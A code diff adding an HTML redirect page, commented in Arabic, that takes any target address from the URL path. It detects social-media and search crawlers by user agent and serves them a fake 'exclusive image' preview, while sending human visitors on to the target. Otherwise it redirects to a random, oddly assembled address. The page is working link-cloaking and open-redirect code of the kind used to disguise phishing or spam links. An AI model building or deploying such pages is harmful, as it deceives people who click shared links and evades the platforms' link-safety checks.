@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Redirecting...</title>
+    <script>
+        // دالة التحويل العشوائي الأصلية بتاعتك
+        function executeHumanRedirect() {
+            const a = "goog";
+            const b = ".le";
+            const c = "..com?";
+            const d = Math.ceil(Math.random() * 24);
+            const finalUrl = "https://" + a + b + c + d;
+            window.location.replace(finalUrl);
+        }
+
+        try {
+            // نفس منطق قراءة الـ pathname اللي في الكود بتاعك
+            let pathname = window.location.pathname.substring(1);
+            
+            try {  
+                pathname = decodeURIComponent(pathname);  
+            } catch(err) {}
+
+            let targetUrl = pathname && !pathname.startsWith("http") ? pathname : pathname || "";
+            let userAgent = navigator.userAgent || "";
+            
+            // نفس فحص البوتات بالحرف
+            let isBot = /facebookexternalhit|Facebot|Twitterbot|Googlebot|LinkedInBot|WhatsApp|Bluesky|MetaInspector/i.test(userAgent);
+
+            // إذا كان بوت ومعه رابط مستهدف، بنحط له ميتات المعاينة ونوجهه
+            if (isBot && targetUrl) {
+                let metaImage = document.createElement('meta');
+                metaImage.setAttribute('property', 'og:image');
+                metaImage.setAttribute('content', targetUrl);
+                document.head.appendChild(metaImage);
+
+                let metaTitle = document.createElement('meta');
+                metaTitle.setAttribute('property', 'og:title');
+                metaTitle.setAttribute('content', 'صورة حصريّة');
+                document.head.appendChild(metaTitle);
+
+                setTimeout(() => {
+                    window.location.replace(targetUrl);
+                }, 100);
+            } 
+            else if (!isBot && targetUrl) {
+                // لو زائر بشري ومعاه رابط، يروح عليه
+                window.location.replace(targetUrl);
+            } 
+            else {
+                // لو زائر بشري لوحده (مفيش مسار)، يشتغل التحويل العشوائي الأصلي
+                executeHumanRedirect();
+            }
+
+        } catch (err) {
+            // حماية تمنع ظهور أي إيرور بنفس فكرة الكود الأصلي
+            executeHumanRedirect();
+        }
+    </script>
+</head>
+<body>
+</body>
+</html>
